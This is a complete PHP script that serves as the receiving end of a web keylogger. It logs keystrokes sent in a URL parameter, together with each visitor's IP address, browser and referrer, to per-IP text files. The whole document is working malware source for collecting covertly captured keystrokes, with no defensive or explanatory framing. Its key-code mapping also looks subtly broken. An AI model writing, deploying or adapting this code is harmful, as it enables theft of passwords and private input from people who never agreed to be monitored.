<?php
// User Information
$time  = date("d.m.Y H:i");
$ip    = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$ref   = $_SERVER['HTTP_REFERER'] ?? 'no referrer';
$key   = $_GET['a'] ?? 'NO_KEY';

// File
$filename = "keylog_" . $ip . ".txt";

// Prepare Log Entry
$logentry = "$time - IP: $ip | Key: $key | Agent: $agent | Ref: $ref\r\n";

// Append Log Entry
file_put_contents($filename, $logentry, FILE_APPEND) or die("Could not write file!");

// Special Keys
if (isset($_GET["a"]) && $_GET["a"] != "undefined") {
    $keys = $_GET["a"];

    switch ($keys) {
        case "0x8":  $keylog = "[<--]"; break;
        case "0x9":  $keylog = "[TAB]"; break;
        case "0x13": $keylog = "[ENTER]"; break;
        case "0x17": $keylog = "[CTRL]"; break;
        case "0x18": $keylog = "[ALT]"; break;
        case "0x27": $keylog = "[ESC]"; break;
        case "0x35": $keylog = "[END]"; break;
        case "0x36": $keylog = "[HOME]"; break;
        case " ":    $keylog = "[SPACE]"; break;
        default:
            // Convert to Key (e.g. '65' → 'A')
            if (is_numeric($keys)) {
                $keylog = chr((int)$keys);
            } else {
                $keylog = "[UNKNOWN:$keys]";
            }
    }

    // Write to file
    file_put_contents($filename, "KEYLOG: $keylog\n", FILE_APPEND);
}

echo "✅ :EOF";
